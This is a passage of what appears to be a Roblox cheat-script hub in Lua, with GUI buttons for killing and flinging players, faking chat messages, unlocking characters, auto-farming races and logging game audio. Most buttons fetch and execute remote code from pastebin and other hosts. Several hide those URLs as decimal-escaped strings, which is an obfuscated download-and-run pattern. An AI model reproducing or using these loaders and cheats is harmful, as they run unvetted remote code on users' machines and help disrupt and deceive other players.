LS.C0 = LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.22+0.14*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+2.5*math.cos(sine/10)),math.rad(90+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+-2.5*math.cos(sine/10)),math.rad(-90+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(2.54+0*math.cos(sine/10),0+0*math.cos(sine/10),0.2+-0.14*math.cos(sine/10))*CFrame.Angles(math.rad(90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-2.54+0*math.cos(sine/10),0+0*math.cos(sine/10),0.2+-0.14*math.cos(sine/10))*CFrame.Angles(math.rad(90+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run
NECK.C0 = NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0 = RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1.47+0.5*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(-45+5.58*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0 = RS.C0:Lerp(CFrame.new(0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(-24.98+0*math.cos(sine/10)),math.rad(113+0*math.cos(sine/10))),.2) 
LS.C0 = LS.C0:Lerp(CFrame.new(-0.68+0*math.cos(sine/10),0+0*math.cos(sine/10),0.93+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(24.98+0*math.cos(sine/10)),math.rad(-113+0*math.cos(sine/10))),.2) 
RH.C0 = RH.C0:Lerp(CFrame.new(1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(-24.98+-32.62*math.cos(sine/10)),math.rad(113+28.51*math.cos(sine/10))),.2) 
LH.C0 = LH.C0:Lerp(CFrame.new(-1.7+0*math.cos(sine/10),0.5+0*math.cos(sine/10),1.4+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+28.51*math.cos(sine/10)),math.rad(24.98+32.62*math.cos(sine/10)),math.rad(-113+-28.51*math.cos(sine/10))),.2)
end
srv.RenderStepped:Wait()
end
end)()
end)

Section:NewLabel("GhostPlayer scripts")

Section:NewButton("Target Players gui", "Idk who made this", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\56\117\81\76\49\109\84\39\41\41\40\41\10")()
end)
Section:NewButton("Workout Island  fe Script", "Ghostplayer", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\72\74\77\50\85\52\72\51\39\41\41\40\41\10")()
end)
Section:NewButton("Kill Gui", "Ghost", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\85\101\119\99\54\105\53\39\41\41\40\41\10")()
end)
Section:NewButton("Tp back Gui", "Ghost", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/1dM3mAJq'))()
end)
Section:NewButton("Fling Player Gui", "idk", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/fj5VwQtC'))()
end)
Section:NewButton("Chat Hax Fake message fe", "Idk", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
end)
Section:NewButton("Fe Invisible toggle gui", "fe ", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
end)
Section:NewButton("R6 possing gui Fe only r6", "Oke", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/sZMn81tZ'))()
end)

Section:NewLabel("end of GhostPlayer's scripts")

Section:NewButton("GhostHub Zombie Attack script", "Idk", function()
    loadstring(game:HttpGet('https://ghost-storage.7m.pl/scripts/ghosthublauncher.lua'))()
end)
Section:NewButton("Car dealership tycoon auto farm (cannot be turned off)", "Cannot turn off", function()
    local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
 vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
 wait(1)
 vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
 
getgenv().Farm = true
 
local RaceLocation = Vector3.new(2198.93701, 638.532166, 1307.18494, -4.76837158e-05, -0.996190667, -0.0872024298, -1, 4.76837158e-05, 2.08243728e-06, 2.08243728e-06, 0.0872024298, -0.996190667)
 
 
 
local IsA = game.IsA
local function GetFromPlayerCar()
   for I,V in pairs(game:GetService("Workspace").Cars:GetDescendants()) do 
       if V.Name == "Owner" then 
           if V.Value == game.Players.LocalPlayer.Name then 
               return V.Parent.Parent
           end
       end
   end
   return "Not Find Car"
end
 
local function TpCar(Pos)
   for I,V in pairs(GetFromPlayerCar():GetDescendants()) do 
       if IsA(V,"BasePart") then 
           if getgenv().Farm == true then
               local Tween = game:GetService("TweenService")
               Tween:create(V,TweenInfo.new(1),{CFrame = CFrame.new(Pos)}):Play()
           end
       end
   end
end
 
 
local function RaceFarm()
   for I,V in pairs(game:GetService("Workspace").Races.Race.Checkpoints:GetDescendants()) do 
       if V.Name == "IsActive" then
           if game:GetService("Workspace").Races.Race.Script.RaceProgress.Value == true then
               if game:GetService("Workspace").Races.Race.GoalCheckpoint.IsActive.Value == true then
               TpCar(V.Parent.Parent.Parent:FindFirstChild("GoalCheckpoint").GoalCheckpoint.Position + Vector3.new(0,-50,0))
               elseif V.Value == true then
               TpCar(V.Parent:FindFirstChild("Checkpoint").Position + Vector3.new(0,-50,0)) 
               end
           end
       end
   end
end
 
 
local function StartRace()
   for I,V in pairs(game:GetService("Workspace").Races.Race.Checkpoints:GetDescendants()) do 
       if V.Name == "IsActive" then 
           if V.Value == true or game:GetService("Workspace").Races.Race.GoalCheckpoint.IsActive.Value == true then 
               return true
           end
       end
   end
   return false
end
 
 
while getgenv().Farm == true do wait() 
   for I,V in pairs(GetFromPlayerCar():GetDescendants()) do 
       if V.Name == "Engine" and IsA(V,"BasePart") then 
           TpCar(RaceLocation)
           workspace.Races.RaceHandler.StartLobby:FireServer("Race")
           local args = {
           [1] = "5",
           [2] = "Vote"
           }
           workspace.Races.Race.Script.Vote:FireServer(unpack(args))
           if StartRace() == true  then
           RaceFarm()
           end
       end
   end
end
end)

Section:NewButton("Shinobi Storm Unlock All Characters", "fe", function()
     loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\120\87\116\74\99\72\81\10"))()
end)
Section:NewButton("Ruby Hub (Build a Boat For treasure script)", "ButtonInfo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Deni210/BABFT/main/Ruby%20Hub", true))()
end)
Section:NewButton("Edge Audio Logger Sound music detection", "idk", function()
    aa = game:GetObjects("rbxassetid://01997056190")[1]
aa.Parent = game.CoreGui
wait(0.2)
GUI = aa.PopupFrame.PopupFrame
pos = 0
 
ignore = {
	"rbxasset://sounds/action_get_up.mp3",
	"rbxasset://sounds/uuhhh.mp3",
	"rbxasset://sounds/action_falling.mp3",
	"rbxasset://sounds/action_jump.mp3",
	"rbxasset://sounds/action_jump_land.mp3",
	"rbxasset://sounds/impact_water.mp3",
	"rbxasset://sounds/action_swim.mp3",
	"rbxasset://sounds/action_footsteps_plastic.mp3"
}
 
GUI.Close.MouseButton1Click:connect(function()
	GUI:TweenSize(UDim2.new(0, 360, 0, 0),"Out","Quad",0.5,true) wait(0.6)
	GUI.Parent:TweenSize(UDim2.new(0, 0, 0, 20),"Out","Quad",0.5,true) wait(0.6)
	aa:Destroy()
end)
 
local min = false
GUI.Minimize.MouseButton1Click:connect(function()
	if min == false then
		GUI:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) min = true
	else
		GUI:TweenSize(UDim2.new(0, 360, 0, 260),"Out","Quad",0.5,true) min = false
	end
end)
 
function printTable(tbl)
	if type(tbl) ~= 'table' then return nil end
	local depthCount = -15
 
	local function run(val, inPrefix)
		depthCount = depthCount + 15
		-- if inPrefix then print(string.rep(' ', depthCount) .. '{') end
		for i,v in pairs(val) do
			if type(v) == 'table' then
				-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {')
				GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {'
				run(v, false)
				wait()
			else
				-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v))
				GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v)
				wait()
			end
		end
		-- print(string.rep(' ', depthCount) .. '}')
		depthCount = depthCount - 15
	end
	run(tbl, true)
end
 
function refreshlist()
	pos = 0
	GUI.Logs.CanvasSize = UDim2.new(0,0,0,0)
	for i,v in pairs(GUI.Logs:GetChildren()) do
		v.Position = UDim2.new(0,0,0, pos)
		GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
		pos = pos+20
	end
end
 
function FindTable(Table, Name)
	for i,v in pairs(Table) do
		if v == Name then
			return true
		end end
	return false
end
 
function writefileExploit()
	if writefile then
		return true
	end
end
 
writeaudio = {}
running = false
GUI.SS.MouseButton1Click:connect(function()
	if writefileExploit() then
		if running == false then
			GUI.Load.Visible = true running = true
			GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
			for _, child in pairs(GUI.Logs:GetChildren()) do
				if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
					if bttn.BackgroundTransparency == 0 then
						writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
					end
				end
			end
			GUI.Store.Visible = true
			printTable(writeaudio)
			wait(0.2)
			local filename = 0
			local function write()
				local file
				pcall(function() file = readfile("Audios"..filename..".txt") end)
				if file then
					filename = filename+1
					write()
				else
					local text = tostring(GUI.Store.Text)
					text = text:gsub('\n', '\r\n')
					writefile("Audios"..filename..".txt", text)
				end
			end
			write()
			for rep = 1,10 do
			GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
			wait(0.05)
			end
			GUI.Load.Visible = false
			GUI.Load.BackgroundTransparency = 0
			GUI.Load.Size = UDim2.new(0, 0, 0, 20)
			running = false
			GUI.Store.Visible = false
			GUI.Store.Text = ''
			writeaudio = {}
			game:FindService('StarterGui'):SetCore('SendNotification', {
				Title = 'Audio Logger',
				Text = 'Saved audios\n(Audios'..filename..'.txt)',
				Icon = 'http://www.roblox.com/asset/?id=176572847',
				Duration = 5,
			})
		end
	else
		game:FindService('StarterGui'):SetCore('SendNotification', {
			Title = 'Audio Logger',
			Text = 'Exploit cannot writefile :(',
			Icon = 'http://www.roblox.com/asset/?id=176572847',
			Duration = 5,
		})
	end
end)
 
GUI.SA.MouseButton1Click:connect(function()
	if writefileExploit() then
		if running == false then
			GUI.Load.Visible = true running = true
			GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
			for _, child in pairs(GUI.Logs:GetChildren()) do
				writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
			end
			GUI.Store.Visible = true
			printTable(writeaudio)
			wait(0.2)
			local filename = 0
			local function write()
				local file
				pcall(function() file = readfile("Audios"..filename..".txt") end)
				if file then
					filename = filename+1
					write()
				else
					local text = tostring(GUI.Store.Text)
					text = text:gsub('\n', '\r\n')
					writefile("Audios"..filename..".txt", text)
				end
			end
			write()
			for rep = 1,10 do
				GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
				wait(0.05)
			end
			GUI.Load.Visible = false
			GUI.Load.BackgroundTransparency = 0
			GUI.Load.Size = UDim2.new(0, 0, 0, 20)
			running = false
			GUI.Store.Visible = false
			GUI.Store.Text = ''
			writeaudio = {}
			game:FindService('StarterGui'):SetCore('SendNotification', {
				Title = 'Audio Logger',
				Text = 'Saved audios\n(Audios'..filename..'.txt)',
				Icon = 'http://www.roblox.com/asset/?id=176572847',
				Duration = 5,
			})
		end
	else
		game:FindService('StarterGui'):SetCore('SendNotification', {
			Title = 'Audio Logger',
			Text = 'Exploit cannot writefile :(',
			Icon = 'http://www.roblox.com/asset/?id=176572847',
			Duration = 5,
		})
	end
end)
 
selectedaudio = nil
function getaudio(place)
	if running == false then
		GUI.Load.Visible = true running = true
		GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
		for _, child in pairs(place:GetDescendants()) do
			spawn(function()
				if child:IsA("Sound") and not GUI.Logs:FindFirstChild(child.SoundId) and not FindTable(ignore,child.SoundId) then
					local id = string.match(child.SoundId, "rbxasset://sounds.+") or string.match(child.SoundId, "&hash=.+") or string.match(child.SoundId, "%d+")
					if id ~= nil then		
						local newsound = GUI.Audio:Clone()
						if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
							id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
							newsound.ImageButton.Image = 'rbxassetid://1453863294'
						end
						newsound.Parent = GUI.Logs
						newsound.Name = child.SoundId
						newsound.Visible = true
						newsound.Position = UDim2.new(0,0,0, pos)
						GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
						pos = pos+20
						local function findname()
							Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
						end
						local audioname = 'error'
						local success, message = pcall(findname)
						if success then
    						newsound.TextLabel.Text = Asset.Name
							audioname = Asset.Name
						else
							newsound.TextLabel.Text = child.Name
							audioname = child.Name
						end
						local data = Instance.new('StringValue') data.Parent = newsound data.Value = child.SoundId data.Name = 'ID'
						local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
						local soundselected = false
						newsound.ImageButton.MouseButton1Click:Connect(function()
							if GUI.Info.Visible ~= true then
								if soundselected == false then soundselected = true
									newsound.ImageButton.BackgroundTransparency = 0
								else soundselected = false
									newsound.ImageButton.BackgroundTransparency = 1
								end
							end
						end)
						newsound.Click.MouseButton1Click:Connect(function()
							if GUI.Info.Visible ~= true then
								GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. child.SoundId .. "\n\nWorkspace Name: " .. child.Name
								selectedaudio = child.SoundId
								GUI.Info.Visible = true
							end
						end)
					end
				end
			end)
		end
	end
	for rep = 1,10 do
		GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
		wait(0.05)
	end
	GUI.Load.Visible = false
	GUI.Load.BackgroundTransparency = 0
	GUI.Load.Size = UDim2.new(0, 0, 0, 20)
	running = false
end
 
GUI.All.MouseButton1Click:connect(function() getaudio(game)end)
GUI.Workspace.MouseButton1Click:connect(function() getaudio(workspace)end)
GUI.Lighting.MouseButton1Click:connect(function() getaudio(game:GetService('Lighting'))end)
GUI.SoundS.MouseButton1Click:connect(function() getaudio(game:GetService('SoundService'))end)
GUI.Clr.MouseButton1Click:connect(function()
	for _, child in pairs(GUI.Logs:GetChildren()) do
		if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
			if bttn.BackgroundTransparency == 1 then
				bttn.Parent:Destroy()
				refreshlist()
			end
		end
	end
end)
GUI.ClrS.MouseButton1Click:connect(function()
	for _, child in pairs(GUI.Logs:GetChildren()) do
		if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
			if bttn.BackgroundTransparency == 0 then
				bttn.Parent:Destroy()
				refreshlist()
			end
		end
	end
end)
autoscan = false
GUI.AutoScan.MouseButton1Click:connect(function()
	if autoscan == false then autoscan = true
		GUI.AutoScan.BackgroundTransparency = 0.5
		game:FindService('StarterGui'):SetCore('SendNotification', {
			Title = 'Audio Logger',
			Text = 'Auto Scan ENABLED',
			Icon = 'http://www.roblox.com/asset/?id=176572847',
			Duration = 5,
		})
	else autoscan = false
		GUI.AutoScan.BackgroundTransparency = 0
		game:FindService('StarterGui'):SetCore('SendNotification', {
			Title = 'Audio Logger',
			Text = 'Auto Scan DISABLED',
			Icon = 'http://www.roblox.com/asset/?id=176572847',
			Duration = 5,
		})
	end
end)
 
game.DescendantAdded:connect(function(added)
	wait()
	if autoscan == true and added:IsA('Sound') and not GUI.Logs:FindFirstChild(added.SoundId) and not FindTable(ignore,added.SoundId) then
		local id = string.match(added.SoundId, "rbxasset://sounds.+") or string.match(added.SoundId, "&hash=.+") or string.match(added.SoundId, "%d+")
		if id ~= nil then		
			local newsound = GUI.Audio:Clone()
				if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
					id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
					newsound.ImageButton.Image = 'rbxassetid://1453863294'
				end
				local scrolldown = false
				newsound.Parent = GUI.Logs
				newsound.Name = added.SoundId
				newsound.Visible = true
				newsound.Position = UDim2.new(0,0,0, pos)
				if GUI.Logs.CanvasPosition.Y == GUI.Logs.CanvasSize.Y.Offset - 230 then
					scrolldown = true
				end
				GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
				pos = pos+20
				local function findname()
					Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
				end
				local audioname = 'error'
				local success, message = pcall(findname)
				if success then
    				newsound.TextLabel.Text = Asset.Name
					audioname = Asset.Name
				else 
					newsound.TextLabel.Text = added.Name
					audioname = added.Name
				end
				local data = Instance.new('StringValue') data.Parent = newsound data.Value = added.SoundId data.Name = 'ID'
				local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
				local soundselected = false
				newsound.ImageButton.MouseButton1Click:Connect(function()
					if GUI.Info.Visible ~= true then
						if soundselected == false then soundselected = true
							newsound.ImageButton.BackgroundTransparency = 0
						else soundselected = false
							newsound.ImageButton.BackgroundTransparency = 1
						end
					end
				end)
				newsound.Click.MouseButton1Click:Connect(function()
					if GUI.Info.Visible ~= true then
						GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. added.SoundId .. "\n\nWorkspace Name: " .. added.Name
						selectedaudio = added.SoundId
						GUI.Info.Visible = true
					end
				end)
				--230'
			if scrolldown == true then
				GUI.Logs.CanvasPosition = Vector2.new(0, 9999999999999999999999999999999999999999999, 0, 0)
			end
		end
	end
end)
 
GUI.Info.Copy.MouseButton1Click:Connect(function()
	if pcall(function() Synapse:Copy(selectedaudio) end) then	
	else
		local clip = setclipboard or Clipboard.set
		clip(selectedaudio)
	end
	game:FindService('StarterGui'):SetCore('SendNotification', {
		Title = 'Audio Logger',
		Text = 'Copied to clipboard',
		Icon = 'http://www.roblox.com/asset/?id=176572847',
		Duration = 5,
	})
end)
 
GUI.Info.Close.MouseButton1Click:Connect(function()
	GUI.Info.Visible = false
	for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
		if sound.Name == 'SampleSound' then
			sound:Destroy()
		end
	end
	GUI.Info.Listen.Text = 'Listen'
end)
 
GUI.Info.Listen.MouseButton1Click:Connect(function()
	if GUI.Info.Listen.Text == 'Listen' then
		local samplesound = Instance.new('Sound') samplesound.Parent = game:GetService('Players').LocalPlayer.PlayerGui
		samplesound.Looped = true samplesound.SoundId = selectedaudio samplesound:Play() samplesound.Name = 'SampleSound'
		samplesound.Volume = 5
		GUI.Info.Listen.Text = 'Stop'
	else
		for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
			if sound.Name == 'SampleSound' then
				sound:Destroy()
			end
		end
		GUI.Info.Listen.Text = 'Listen'
	end
end)
 
function drag(gui)
	spawn(function()
		local UserInputService = game:GetService("UserInputService")
		local dragging
		local dragInput
		local dragStart
		local startPos
		local function update(input)
			local delta = input.Position - dragStart
			gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil) 
		end
		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
		input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
gui.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
end)
end
drag(aa.PopupFrame)
end)

Section:NewButton("Fe AntiFling Op different Anti fling", "FE DOESN'T NOCLIP BEST ANTI FLING", function()
    -- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
                       Text = "Fling Exploit detected, Player: " .. tostring(Player);
                       Color = Color3.fromRGB(255, 200, 0);
                   })
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition

           game.StarterGui:SetCore("ChatMakeSystemMessage", {
